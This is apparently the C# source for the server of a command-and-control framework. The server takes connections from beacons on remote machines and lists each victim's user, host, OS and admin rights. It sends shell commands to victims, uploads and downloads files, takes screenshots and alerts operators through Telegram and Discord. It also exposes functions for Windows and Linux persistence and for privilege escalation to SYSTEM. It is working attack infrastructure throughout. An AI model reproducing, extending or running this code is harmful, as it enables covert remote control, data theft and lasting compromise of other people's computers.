using C2Framework;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

public class C2Server
{
    private X509Certificate2 _serverCertificate;
    private static readonly RandomNumberGenerator _secureRandom = RandomNumberGenerator.Create();
    private string _ipAddress;
    private int _port;
    private TcpListener _listener;
    private Dictionary<string, ClientHandler> _clients;
    private ClientHandler _activeClient;
    private bool _running;
    private DateTime _startTime;
    private readonly Dictionary<string, List<DateTime>> _connectionAttempts = new Dictionary<string, List<DateTime>>();
    private const int MaxConnectionsPerMinute = 10;
    private HashSet<string> _displayedSystemInfo = new HashSet<string>();
    private MultiplayerManager _multiplayerManager;
    private TelegramNotificationManager _telegramManager;
    private ConcurrentDictionary<string, ConnectedOperator> _connectedOperators;
    private Dictionary<string, ConnectedOperator> _activeOperatorSessions;
    private object _operatorLock;
    private object _operatorConnectionLock;
    private DiscordNotificationManager _discordManager;
    public DiscordNotificationManager GetDiscordManager() => _discordManager;
    private C2CommandProcessor _commandProcessor;
    private C2FileManager _fileManager;

    public enum SessionPolicy
    {
        RejectNew,
        DisconnectOld
    }
    public SessionPolicy OperatorSessionPolicy { get; set; } = SessionPolicy.DisconnectOld;

    public int ClientCount => _clients.Count(c => c.Value.IsConnected);
    public TimeSpan Uptime => DateTime.Now - _startTime;
    public string ActiveClientId => _activeClient?.ClientId;
    public void SetLastCommandOperatorId(string operatorId) => _commandProcessor.SetLastCommandOperatorId(operatorId);
    public async Task ShowPersistenceMenu() => await _commandProcessor.ShowPersistenceMenu();
    public async Task ShowLinuxPersistenceMenuWithTime() => await _commandProcessor.ShowLinuxPersistenceMenuWithTime();
    public async Task CleanupLinuxTimedPersistence() => await _commandProcessor.CleanupLinuxTimedPersistence();
    public async Task CleanupLinuxPersistence() => await _commandProcessor.CleanupLinuxPersistence();
    public async Task CleanupWindowsPersistence() => await _commandProcessor.CleanupWindowsPersistence();
    public void ProcessLinuxPersistCommand(string command) => _commandProcessor.ProcessLinuxPersistCommand(command);
    public async Task ElevateToSystemWithUpload(string agentLocalPath) => await _commandProcessor.ElevateToSystemWithUpload(agentLocalPath);
    public async Task InstallWindowsPersistence(int method, string agentPath = null) => await _commandProcessor.InstallWindowsPersistence(method, agentPath);
    public async Task SendDiscordMessage(string message) => await _discordManager.SendDiscordMessage(message);
    public void ToggleDiscordNotifications(bool enable) => _discordManager.ToggleDiscordNotifications(enable);
    public void ConfigureDiscordBot(string token, string channelId, string guildId = "") =>
        _discordManager.ConfigureDiscordBot(token, channelId, guildId);
    public async Task TestDiscordNotification() => await _discordManager.TestDiscordNotification();
    public void ShowDiscordStatus() => _discordManager.ShowDiscordStatus();
    public event EventHandler<OutputMessageEventArgs> OutputMessage;
    public event EventHandler ClientListChanged;
    public event EventHandler OperatorListChanged;

    public C2Server(string ipAddress, int port)
    {
        try
        {
            InitializeNetworking(ipAddress, port);
            InitializeCollections();
            InitializeManagers();
            InitializeCertificate();
            _commandProcessor = new C2CommandProcessor(this);
            _fileManager = new C2FileManager(this);

            SafeRaiseOutputMessage($"[+] C2Server initialized successfully on {_ipAddress}:{_port}", Color.Green);
        }
        catch (Exception ex)
        {
            SafeRaiseOutputMessage($"[!] Fatal error in C2Server constructor: {ex.Message}", Color.Red);
            throw;
        }
    }

    private void InitializeNetworking(string ipAddress, int port)
    {
        if (string.IsNullOrEmpty(ipAddress) || ipAddress == "0.0.0.0")
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    if (endPoint?.Address != null)
                    {
                        _ipAddress = endPoint.Address.ToString();
                    }
                    else
                    {
                        throw new InvalidOperationException("Could not determine local IP address");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Auto IP detection failed: {ex.Message}, using localhost");
                _ipAddress = "127.0.0.1";
            }
        }
        else
        {
            _ipAddress = ipAddress;
        }

        if (!IPAddress.TryParse(_ipAddress, out IPAddress validatedIP))
        {
            throw new ArgumentException($"Invalid IP address: {_ipAddress}");
        }

        if (port <= 0 || port > 65535)
        {
            throw new ArgumentException($"Invalid port: {port}. Must be between 1 and 65535.");
        }
        _port = port;
    }

    private void InitializeCollections()
    {
        _clients = new Dictionary<string, ClientHandler>();
        _running = false;
        _displayedSystemInfo = new HashSet<string>();
        _connectedOperators = new ConcurrentDictionary<string, ConnectedOperator>();
        _activeOperatorSessions = new Dictionary<string, ConnectedOperator>();
        _operatorLock = new object();
        _operatorConnectionLock = new object();
    }

    private void InitializeManagers()
    {
        _telegramManager = new TelegramNotificationManager();
        _telegramManager.OutputMessage += (sender, e) =>
        {
            SafeRaiseOutputMessage(e.Message, e.Color);
        };

        _discordManager = new DiscordNotificationManager();
        _discordManager.OutputMessage += (sender, e) =>
        {
            SafeRaiseOutputMessage(e.Message, e.Color);
        };
    }

    private void InitializeCertificate()
    {
        try
        {
            _serverCertificate = CertificateManager.GetOrCreateCertificate();
            if (_serverCertificate == null)
            {
                throw new InvalidOperationException("Certificate manager returned null");
            }
            SafeRaiseOutputMessage("[+] Server certificate loaded successfully", Color.Green);
        }
        catch (Exception ex)
        {
            SafeRaiseOutputMessage($"[!] Critical error loading certificate: {ex.Message}", Color.Red);
            throw new InvalidOperationException("Failed to load server certificate", ex);
        }

        _multiplayerManager = new MultiplayerManager(this, _ipAddress, _serverCertificate);
        _multiplayerManager.OutputMessage += (sender, e) =>
        {
            SafeRaiseOutputMessage(e.Message, e.Color);
        };
        _multiplayerManager.OperatorListChanged += (sender, e) =>
        {
            SafeRaiseOperatorListChanged();
        };
    }

    public void Start()
    {
        try
        {
            ValidateStartPrerequisites();

            if (!IPAddress.TryParse(_ipAddress, out IPAddress parsedIP))
                throw new ArgumentException($"Invalid IP address format: {_ipAddress}");

            RaiseOutputMessage($"[*] Starting C2 server on {parsedIP}:{_port}", Color.Yellow);

            _listener = new TcpListener(parsedIP, _port);
            _listener.Start();
            _running = true;
            _startTime = DateTime.Now;

            RaiseOutputMessage($"[+] C2 Server started on {_ipAddress}:{_port}", Color.Green);
            RaiseOutputMessage("[*] Waiting for incoming connections...", Color.Yellow);

            Task.Run(() => AcceptClientsAsync()).ConfigureAwait(false);
            RaiseOutputMessage("[+] Server startup completed successfully", Color.Green);
        }
        catch (Exception ex)
        {
            HandleStartupError(ex);
            throw;
        }
    }

    public void Stop()
    {
        try
        {
            RaiseOutputMessage("[*] Shutting down C2 server...", Color.Yellow);

            if (_running)
            {
                _running = false;
                DisconnectAllClients();
                StopListener();
                StopMultiplayerServer();
                SendShutdownNotification();
                RaiseOutputMessage("[+] Server shutdown completed", Color.Green);
            }
            else
            {
                RaiseOutputMessage("[*] Server was not running", Color.Yellow);
            }
        }
        catch (Exception ex)
        {
            RaiseOutputMessage($"[!] Error during server shutdown: {ex.Message}", Color.Red);
        }
    }

    private async Task AcceptClientsAsync()
    {
        while (_running)
        {
            try
            {
                TcpClient client = await _listener.AcceptTcpClientAsync();
                await ProcessNewClient(client);
            }
            catch (Exception ex)
            {
                if (_running)
                    RaiseOutputMessage($"[!] Error accepting client: {ex.Message}", Color.Red);
            }
        }
    }

    private async Task ProcessNewClient(TcpClient client)
    {
        IPEndPoint remoteEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;
        if (!ValidateNewConnection(remoteEndPoint))
        {
            client.Close();
            return;
        }

        ConfigureClient(client);
        string clientId = GenerateClientId();
        string clientInfo = $"{remoteEndPoint.Address}:{remoteEndPoint.Port}";

        ClientHandler handler = new ClientHandler(client, clientId, clientInfo, _serverCertificate);
        handler.ResponseReceived += ClientHandler_ResponseReceived;
        handler.StatusChanged += ClientHandler_StatusChanged;

        _clients.Add(clientId, handler);

        Thread clientThread = new Thread(handler.HandleClient);
        clientThread.IsBackground = true;
        clientThread.Start();

        RaiseClientListChanged();
        RaiseOutputMessage($"[+] New connection from {clientInfo} (ID: {clientId})", Color.Green);

        if (IsOperatorServerRunning)
        {
            BroadcastClientUpdate(clientId, "CONNECTED");
        }

        await HandleNewClientSetup(handler);

        // Telegram notification
        Task.Run(async () =>
        {
            try
            {
                await _telegramManager.NotifyNewBeacon(handler);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error sending Telegram notification: {ex.Message}");
            }
        });
        if (_discordManager != null)
        {
            Task.Run(async () =>
            {
                try
                {
                    await _discordManager.NotifyBeaconConnection(handler, true);  // Uncomment this
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error sending Discord notification: {ex.Message}");
                }
            });
        }
        if (_clients.Count % 10 == 0)
        {
            Task.Run(async () => await _discordManager.SendServerStatistics(
                ClientCount,
                Uptime,
                _clients.Count
            ));
        }

    }

    public void SendCommand(string command)
    {
        _commandProcessor.SendCommand(command, _activeClient);
    }

    public async Task DownloadFile(string remotePath, string downloadPath = null)
    {
        await _fileManager.DownloadFile(_activeClient, remotePath, downloadPath);
    }

    public async Task UploadFileWithProgress(string localPath, string remotePath, Action<int> progressCallback)
    {
        await _fileManager.UploadFileWithProgress(_activeClient, localPath, remotePath, progressCallback);
    }

    public async void CaptureScreenshot(string downloadPath, bool sendToDiscord = false)
    {
        await _fileManager.CaptureScreenshot(_activeClient, downloadPath, sendToDiscord);
    }


    public void ConnectToClient(string clientId)
    {
        if (string.IsNullOrEmpty(clientId))
        {
            RaiseOutputMessage("[!] Please specify a client ID", Color.Red);
            return;
        }

        if (_clients.TryGetValue(clientId, out ClientHandler client))
        {
            if (client.IsConnected)
            {
                _activeClient = client;  // Set active client FIRST

                RaiseClientListChanged();

                RaiseOutputMessage($"[+] Connected to {clientId} ({client.ClientInfo})", Color.Green);
            }
            else
            {
                RaiseOutputMessage($"[!] Client {clientId} is no longer connected", Color.Red);
            }
        }
        else
        {
            RaiseOutputMessage($"[!] Client {clientId} not found", Color.Red);
        }
    }

    public void DisconnectClient()
    {
        _activeClient = null;
        RaiseClientListChanged();
    }

    public void KillClient(string clientId)
    {
        if (string.IsNullOrEmpty(clientId))
        {
            RaiseOutputMessage("[!] Please specify a client ID", Color.Red);
            return;
        }

        if (_clients.TryGetValue(clientId, out ClientHandler client))
        {
            try
            {
                client.SendCommand("exit");
            }
            catch { }

            client.Disconnect();
            _clients.Remove(clientId);

            if (_activeClient != null && _activeClient.ClientId == clientId)
            {
                _activeClient = null;
            }

            RaiseOutputMessage($"[+] Client {clientId} terminated", Color.Green);
            RaiseClientListChanged();

            BroadcastClientUpdate(clientId, "KILLED");
            BroadcastUpdatedClientList();
        }
        else
        {
            RaiseOutputMessage($"[!] Client {clientId} not found", Color.Red);
        }
    }

    public void ShowBeacons()
    {
        if (_clients.Count == 0)
        {
            RaiseOutputMessage("\n[*] No active beacons\n", Color.Yellow);
            return;
        }

        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        StringBuilder sb = new StringBuilder();
        sb.AppendLine($"\n┌─── Active Beacons Report ({timestamp}) ─────────────────────────────────────────────────────────────────────┐");
        sb.AppendLine("│ ID       │ IP Address      │ Type  │ Shell │ User                      │ Computer         │ OS          │ Last │");
        sb.AppendLine("├──────────┼─────────────────┼───────┼───────┼───────────────────────────┼──────────────────┼─────────────┼──────┤");

        int activeCount = 0;
        foreach (var client in _clients)
        {
            if (!client.Value.IsConnected) continue;
            activeCount++;

            string id = client.Key;
            string ipAddr = client.Value.ClientInfo;
            string connType = client.Value.IsEncrypted ? "TLS" : "Plain";
            string shellType = client.Value.ShellType;
            if (shellType.Length > 6) shellType = shellType.Substring(0, 6);

            string user = client.Value.UserName ?? "Unknown";
            if (user.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase))
            {
                user = "SYSTEM";
            }
            else if (client.Value.IsAdmin && !user.Contains("*"))
            {
                user = user + "*";
            }

            if (user.Length > 25) user = user.Substring(0, 22) + "...";

            string computer = client.Value.ComputerName ?? "Unknown";
            if (computer.Length > 16) computer = computer.Substring(0, 13) + "...";

            string os = client.Value.OSVersion ?? "Unknown";
            if (os.Length > 12) os = os.Substring(0, 9) + "...";

            TimeSpan elapsed = DateTime.Now - client.Value.LastSeen;
            string last = elapsed.TotalSeconds < 60 ? "Now" :
                        elapsed.TotalMinutes < 60 ? $"{(int)elapsed.TotalMinutes}m" :
                        elapsed.TotalHours < 24 ? $"{(int)elapsed.TotalHours}h" : $"{(int)elapsed.TotalDays}d";

            string activeMarker = (_activeClient != null && _activeClient.ClientId == client.Key) ? "*" : " ";

            sb.AppendLine($"│{activeMarker}{id,-8} │ {ipAddr,-15} │ {connType,-6}│ {shellType,-6}│ {user,-25} │ {computer,-16} │ {os,-12}│ {last,-4} │");
        }

        sb.AppendLine("└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘");
        sb.AppendLine($"\n[*] Total active beacons: {activeCount}/{_clients.Count}");

        RaiseOutputMessage(sb.ToString(), Color.White);
    }

    // Utility and helper methods
    private void ValidateStartPrerequisites()
    {
        if (string.IsNullOrEmpty(_ipAddress))
            throw new InvalidOperationException("IP address is not set");
        if (_port <= 0 || _port > 65535)
            throw new InvalidOperationException($"Invalid port: {_port}");
        if (_serverCertificate == null)
            throw new InvalidOperationException("Server certificate is not loaded");
        if (_clients == null)
            throw new InvalidOperationException("Client dictionary is not initialized");
    }

    private void HandleStartupError(Exception ex)
    {
        _running = false;
        try
        {
            _listener?.Stop();
            _listener = null;
        }
        catch (Exception cleanupEx)
        {
            RaiseOutputMessage($"[!] Error cleaning up listener: {cleanupEx.Message}", Color.Yellow);
        }

        RaiseOutputMessage($"[!] Error starting server: {ex.Message}", Color.Red);
        if (ex.InnerException != null)
        {
            RaiseOutputMessage($"[!] Inner exception: {ex.InnerException.Message}", Color.Red);
        }
    }

    private void ConfigureClient(TcpClient client)
    {
        client.NoDelay = true;
        client.ReceiveTimeout = 30000;
        client.SendTimeout = 30000;
        client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
        client.ReceiveBufferSize = 65536;
        client.SendBufferSize = 65536;
    }

    private string GenerateClientId()
    {
        byte[] idBytes = new byte[4];
        _secureRandom.GetBytes(idBytes);
        return BitConverter.ToString(idBytes).Replace("-", "");
    }

    private bool ValidateNewConnection(IPEndPoint remoteEndPoint)
    {
        string clientIP = remoteEndPoint.Address.ToString();
        string[] blockedIPs = { "192.168.1.100" };
        if (blockedIPs.Contains(clientIP))
        {
            RaiseOutputMessage($"[!] Blocked connection from {clientIP}", Color.Red);
            return false;
        }

        if (!CheckConnectionRateLimit(clientIP))
        {
            RaiseOutputMessage($"[!] Rate limit exceeded for {clientIP}", Color.Red);
            return false;
        }

        if (_clients.Count >= 50)
        {
            RaiseOutputMessage($"[!] Maximum connections reached, rejecting {clientIP}", Color.Red);
            return false;
        }

        return true;
    }

    private bool CheckConnectionRateLimit(string ip)
    {
        var now = DateTime.Now;
        if (!_connectionAttempts.ContainsKey(ip))
        {
            _connectionAttempts[ip] = new List<DateTime>();
        }

        _connectionAttempts[ip].RemoveAll(time => (now - time).TotalMinutes > 1);

        if (_connectionAttempts[ip].Count >= MaxConnectionsPerMinute)
        {
            return false;
        }

        _connectionAttempts[ip].Add(now);
        return true;
    }

    private async Task HandleNewClientSetup(ClientHandler handler)
    {
        await Task.Delay(2000);

        if (!handler.IsEncrypted && handler.IsConnected)
        {
            int waited = 0;
            bool systemInfoGathered = false;

            while (waited < 10000 && handler.IsConnected && !systemInfoGathered)
            {
                if (handler.UserName != "Unknown" && handler.ComputerName != "Unknown")
                {
                    DisplayClientSystemInfo(handler);
                    systemInfoGathered = true;

                    if (IsOperatorServerRunning)
                    {
                        await Task.Delay(500);
                        BroadcastUpdatedClientList();
                    }
                    break;
                }
                await Task.Delay(500);
                waited += 500;
            }
        }
        else if (handler.IsEncrypted && handler.IsConnected)
        {
            await Task.Delay(3000);
            if (handler.IsConnected && IsOperatorServerRunning)
            {
                BroadcastUpdatedClientList();
            }
        }
    }

    private void DisplayClientSystemInfo(ClientHandler client)
    {
        StringBuilder info = new StringBuilder();
        info.AppendLine($"\n[+] System Information for {client.ClientId}:");
        info.AppendLine("-----------------------------------");
        info.AppendLine($"User: {client.UserName}");
        info.AppendLine($"Computer: {client.ComputerName}");
        info.AppendLine($"OS: {client.OSVersion}");
        info.AppendLine($"Admin: {(client.IsAdmin ? "Yes" : "No")}");
        info.AppendLine($"Connection: {(client.IsEncrypted ? "Encrypted (TLS)" : "Plain Text")}");
        info.AppendLine($"Shell: {client.ShellType}");
        info.AppendLine("-----------------------------------");

        RaiseOutputMessage(info.ToString(), Color.Cyan);
    }

    private void DisconnectAllClients()
    {
        if (_clients != null)
        {
            foreach (var client in _clients.Values.ToList())
            {
                try
                {
                    client.Disconnect();
                }
                catch (Exception ex)
                {
                }
            }
            _clients.Clear();
        }
    }

    private void StopListener()
    {
        try
        {
            _listener?.Stop();
            _listener = null;
        }
        catch (Exception ex)
        {
        }
    }

    private void StopMultiplayerServer()
    {
        try
        {
            _multiplayerManager?.StopOperatorServer();
        }
        catch (Exception ex)
        {
        }
    }

    private void SendShutdownNotification()
    {
        Task.Run(async () =>
        {
            try
            {
                await _telegramManager.NotifyServerShutdown();
                await _discordManager.NotifyServerShutdown();
            }
            catch
            {
                // Ignore notification errors during shutdown
            }
        });
    }

    private void ClientHandler_ResponseReceived(object sender, OutputMessageEventArgs e)
    {
        string formattedMessage = FormatResponseMessage(e.Message);
        OutputMessage?.Invoke(this, new OutputMessageEventArgs(formattedMessage, e.Color));

        if (IsOperatorServerRunning && GetConnectedOperatorCount() > 0)
        {
            string clientId = null;
            if (sender is ClientHandler clientHandler)
            {
                clientId = clientHandler.ClientId;
            }

            Color operatorColor = DetermineOperatorColor(formattedMessage, e.Color);

            Task.Run(async () =>
            {
                try
                {
                    var responseMessage = new OperatorMessage
                    {
                        Type = OperatorMessageType.Response,
                        From = "CLIENT",
                        ClientId = clientId,
                        Data = formattedMessage,
                        ColorHint = ColorToHex(operatorColor)
                    };

                    BroadcastToOperators(responseMessage);
                }
                catch (Exception ex)
                {
                    // Handle error silently
                }
            });
        }
    }

    private void ClientHandler_StatusChanged(object sender, EventArgs e)
    {
        RaiseClientListChanged();

        if (IsOperatorServerRunning)
        {
            ClientHandler client = sender as ClientHandler;
            if (client != null && !client.IsConnected)
            {
                BroadcastClientUpdate(client.ClientId, "DISCONNECTED");
                Task.Run(async () =>
                {
                    await Task.Delay(1000);
                    BroadcastUpdatedClientList();
                });
            }
        }
    }

    private string FormatResponseMessage(string message)
    {
        if (string.IsNullOrEmpty(message) || message.Length < 80)
            return message;

        if (message.Contains("Microsoft.PowerShell.Commands.Internal.Format"))
        {
            return "[PowerShell formatting data - filtered]";
        }

        if (message.Contains("PRIVILEGES INFORMATION") || message.Contains("Privilege Name"))
        {
            return FormatPrivilegeInfo(message);
        }

        if (message.Length > 120 && !message.Contains('\n'))
        {
            return WrapLongLine(message, 120);
        }

        return message;
    }

    private string FormatPrivilegeInfo(string message)
    {
        StringBuilder formatted = new StringBuilder();
        formatted.AppendLine("PRIVILEGES INFORMATION");
        formatted.AppendLine("----------------------");
        formatted.AppendLine();
        formatted.AppendLine("Privilege Name                Description                          State");
        formatted.AppendLine("============================= ==================================== ========");

        var regex = new System.Text.RegularExpressions.Regex(@"(Se\w+Privilege)\s+([^E][^D].*?)\s+(Enabled|Disabled)",
            System.Text.RegularExpressions.RegexOptions.IgnoreCase);

        var matches = regex.Matches(message);

        if (matches.Count > 0)
        {
            foreach (System.Text.RegularExpressions.Match match in matches)
            {
                string privilegeName = match.Groups[1].Value.Trim();
                string description = match.Groups[2].Value.Trim();
                string state = match.Groups[3].Value.Trim();
                formatted.AppendLine($"{privilegeName,-29} {description,-36} {state}");
            }
        }
        else
        {
            string[] lines = message.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string line in lines)
            {
                if (line.Contains("Privilege") && (line.Contains("Enabled") || line.Contains("Disabled")))
                {
                    formatted.AppendLine(line.Trim());
                }
            }
        }

        return formatted.ToString();
    }

    private string WrapLongLine(string text, int maxWidth)
    {
        if (string.IsNullOrEmpty(text) || text.Length <= maxWidth)
            return text;

        StringBuilder wrapped = new StringBuilder();
        int currentIndex = 0;

        while (currentIndex < text.Length)
        {
            int remainingLength = text.Length - currentIndex;
            int lineLength = Math.Min(maxWidth, remainingLength);

            if (lineLength < remainingLength)
            {
                int lastSpace = text.LastIndexOf(' ', currentIndex + lineLength, lineLength);
                if (lastSpace > currentIndex)
                {
                    lineLength = lastSpace - currentIndex;
                }
            }

            wrapped.AppendLine(text.Substring(currentIndex, lineLength));
            currentIndex += lineLength;

            if (currentIndex < text.Length && text[currentIndex] == ' ')
                currentIndex++;
        }

        return wrapped.ToString();
    }

    private Color DetermineOperatorColor(string message, Color originalColor)
    {
        if (IsCommandOutput(message)) return Color.Green;
        if (message.Contains("[!]") || message.Contains("Error") || message.Contains("Failed")) return Color.Red;
        if (message.Contains("[*]") || message.Contains("Warning")) return Color.Yellow;
        if (message.Contains("[+]") || message.Contains("Success")) return Color.Green;
        return Color.Green;
    }

    private bool IsCommandOutput(string message)
    {
        if (message.StartsWith("[") && (message.Contains("DEBUG") || message.Contains("INFO") || message.Contains("*")))
            return false;
        if (string.IsNullOrWhiteSpace(message) || message.Length < 3)
            return false;

        string[] systemPrefixes = { "[+]", "[!]", "[*]", "[DEBUG]", "[INFO]", "[ERROR]", "[SYSTEM]" };
        if (systemPrefixes.Any(prefix => message.TrimStart().StartsWith(prefix)))
            return false;

        return true;
    }

    private string ColorToHex(Color color)
    {
        return $"#{color.R:X2}{color.G:X2}{color.B:X2}";
    }

    public void SafeRaiseOutputMessage(string message, Color color)
    {
        try
        {
            if (OutputMessage != null)
            {
                OutputMessage.Invoke(this, new OutputMessageEventArgs(message, color));
            }
            else
            {
                Console.WriteLine(message);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in SafeRaiseOutputMessage: {ex.Message}");
            Console.WriteLine($"Original message was: {message}");
        }
    }



    private void SafeRaiseOperatorListChanged()
    {
        try
        {
            OperatorListChanged?.Invoke(this, EventArgs.Empty);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in SafeRaiseOperatorListChanged: {ex.Message}");
        }
    }

    public void RaiseOutputMessage(string message, Color color)
    {
        try
        {
            if (string.IsNullOrEmpty(message))
                message = "[Empty message]";

            OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));

            if (_multiplayerManager != null && _multiplayerManager.IsOperatorServerRunning && _multiplayerManager.GetConnectedOperatorCount() > 0)
            {
                if (message.Contains("[*]") || message.Contains("[+]") || message.Contains("[!]"))
                {
                    try
                    {
                        string colorHint = color == Color.Yellow ? "#FFFF00" :
                                          color == Color.Green ? "#00FF00" :
                                          color == Color.Red ? "#FF0000" :
                                          color == Color.Cyan ? "#00FFFF" : "#FFFFFF";

                        _multiplayerManager.BroadcastToOperators(new OperatorMessage
                        {
                            Type = OperatorMessageType.Response,
                            From = "SERVER",
                            Data = message,
                            ColorHint = colorHint
                        });
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Critical error in RaiseOutputMessage: {ex.Message}");
            Console.WriteLine($"Original message was: {message}");
        }
    }

    private void RaiseClientListChanged()
    {
        try
        {
            ClientListChanged?.Invoke(this, EventArgs.Empty);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in RaiseClientListChanged: {ex.Message}");
        }
    }

    // Utility methods and getters
    public IEnumerable<ClientHandler> GetClients() => _clients.Values;
    public string GetActiveClientInfo() => _activeClient?.ClientInfo ?? string.Empty;
    public ClientHandler GetActiveClient() => _activeClient;
    public bool IsActiveClientLinux() => _activeClient?.IsLinux ?? false;
    public int GetPort() => _port;
    public string GetDownloadDirectory() => _fileManager.GetC2DownloadDirectory();

    // Multiplayer delegation methods
    public void InitializeOperatorServer() => _multiplayerManager.Initialize();
    public void StartOperatorServer() => _multiplayerManager.StartOperatorServer();
    public void StopOperatorServer() => _multiplayerManager.StopOperatorServer();
    public void ForceDisconnectUser(string username, string reason = "Forced disconnect by administrator") =>
        _multiplayerManager.ForceDisconnectUser(username, reason);
    public bool IsUserCurrentlyConnected(string username) => _multiplayerManager.IsUserCurrentlyConnected(username);
    public bool IsMultiplayerEnabled() => _multiplayerManager.IsMultiplayerEnabled();
    public int GetConnectedOperatorCount() => _multiplayerManager.GetConnectedOperatorCount();
    public IEnumerable<ConnectedOperator> GetConnectedOperators() => _multiplayerManager.GetConnectedOperators();
    public bool IsOperatorServerRunning => _multiplayerManager.IsOperatorServerRunning;
    public void BroadcastToOperators(OperatorMessage message, string excludeOperatorId = null) =>
        _multiplayerManager.BroadcastToOperators(message, excludeOperatorId);
    public void BroadcastClientUpdate(string clientId, string action) =>
        _multiplayerManager.BroadcastClientUpdate(clientId, action);
    public void BroadcastUpdatedClientList() => _multiplayerManager.BroadcastUpdatedClientList();
    public void BroadcastOperatorListUpdate() => _multiplayerManager.BroadcastOperatorListUpdate();
    public void BroadcastServerCommand(string command, string clientId) =>
        _multiplayerManager.BroadcastServerCommand(command, clientId);
    public void BroadcastCommandResponseToOperators(string clientId, string response) =>
        _multiplayerManager.BroadcastCommandResponseToOperators(clientId, response);

    // Telegram delegation methods
    public async Task SendTelegramMessage(string message) => await _telegramManager.SendTelegramMessage(message);
    public void ToggleTelegramNotifications(bool enable) => _telegramManager.ToggleTelegramNotifications(enable);
    public void ConfigureTelegramBot(string token, string chatId) => _telegramManager.ConfigureTelegramBot(token, chatId);
    public async Task TestTelegramNotification() => await _telegramManager.TestTelegramNotification();
    public void ShowTelegramStatus() => _telegramManager.ShowTelegramStatus();

    // Helper methods for server IP detection
    public string GetServerIPForClient()
    {
        try
        {
            if (_activeClient == null)
            {
                return _ipAddress == "0.0.0.0" ? "127.0.0.1" : _ipAddress;
            }

            string clientInfo = _activeClient.ClientInfo;
            if (!string.IsNullOrEmpty(clientInfo) && clientInfo.Contains(":"))
            {
                string clientIP = clientInfo.Split(':')[0];

                if (_ipAddress != "0.0.0.0")
                {
                    return _ipAddress;
                }

                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                    {
                        socket.Connect(clientIP, 1);
                        IPEndPoint localEndPoint = socket.LocalEndPoint as IPEndPoint;
                        if (localEndPoint != null)
                        {
                            string detectedIP = localEndPoint.Address.ToString();
                            RaiseOutputMessage($"[*] Auto-detected server IP for persistence: {detectedIP}", Color.Cyan);
                            return detectedIP;
                        }
                    }
                }
                catch
                {
                    try
                    {
                        IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
                        foreach (IPAddress ip in host.AddressList)
                        {
                            if (ip.AddressFamily == AddressFamily.InterNetwork)
                            {
                                string ipStr = ip.ToString();
                                if (clientIP.StartsWith("192.168.") && ipStr.StartsWith("192.168."))
                                {
                                    RaiseOutputMessage($"[*] Auto-detected server IP for persistence: {ipStr}", Color.Cyan);
                                    return ipStr;
                                }
                                else if (clientIP.StartsWith("10.") && ipStr.StartsWith("10."))
                                {
                                    RaiseOutputMessage($"[*] Auto-detected server IP for persistence: {ipStr}", Color.Cyan);
                                    return ipStr;
                                }
                                else if (clientIP.StartsWith("172.") && ipStr.StartsWith("172."))
                                {
                                    RaiseOutputMessage($"[*] Auto-detected server IP for persistence: {ipStr}", Color.Cyan);
                                    return ipStr;
                                }
                            }
                        }

                        foreach (IPAddress ip in host.AddressList)
                        {
                            if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                            {
                                string ipStr = ip.ToString();
                                RaiseOutputMessage($"[*] Auto-detected server IP for persistence: {ipStr}", Color.Cyan);
                                return ipStr;
                            }
                        }
                    }
                    catch
                    {
                        // Ultimate fallback
                    }
                }
            }

            string fallbackIP = _ipAddress == "0.0.0.0" ? "127.0.0.1" : _ipAddress;
            RaiseOutputMessage($"[!] Could not auto-detect IP, using fallback: {fallbackIP}", Color.Yellow);
            return fallbackIP;
        }
        catch (Exception ex)
        {
            RaiseOutputMessage($"[!] Error detecting server IP: {ex.Message}", Color.Red);
            return _ipAddress == "0.0.0.0" ? "127.0.0.1" : _ipAddress;
        }
    }

    public class PrependedNetworkStream : Stream
    {
        private readonly Stream _baseStream;
        private readonly byte[] _prependedData;
        private int _prependedPosition = 0;
        private bool _prependedDataConsumed = false;

        public PrependedNetworkStream(Stream baseStream, byte[] prependedData)
        {
            _baseStream = baseStream;
            _prependedData = prependedData;
        }

        public override bool CanRead => _baseStream.CanRead;
        public override bool CanSeek => false;
        public override bool CanWrite => _baseStream.CanWrite;
        public override long Length => throw new NotSupportedException();
        public override long Position
        {
            get => throw new NotSupportedException();
            set => throw new NotSupportedException();
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
            if (!_prependedDataConsumed)
            {
                int bytesToCopy = Math.Min(count, _prependedData.Length - _prependedPosition);
                Array.Copy(_prependedData, _prependedPosition, buffer, offset, bytesToCopy);
                _prependedPosition += bytesToCopy;

                if (_prependedPosition >= _prependedData.Length)
                {
                    _prependedDataConsumed = true;
                }

                return bytesToCopy;
            }

            return _baseStream.Read(buffer, offset, count);
        }

        public override void Write(byte[] buffer, int offset, int count)
        {
            _baseStream.Write(buffer, offset, count);
        }

        public override void Flush()
        {
            _baseStream.Flush();
        }

        public override long Seek(long offset, SeekOrigin origin)
        {
            throw new NotSupportedException();
        }

        public override void SetLength(long value)
        {
            throw new NotSupportedException();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _baseStream?.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}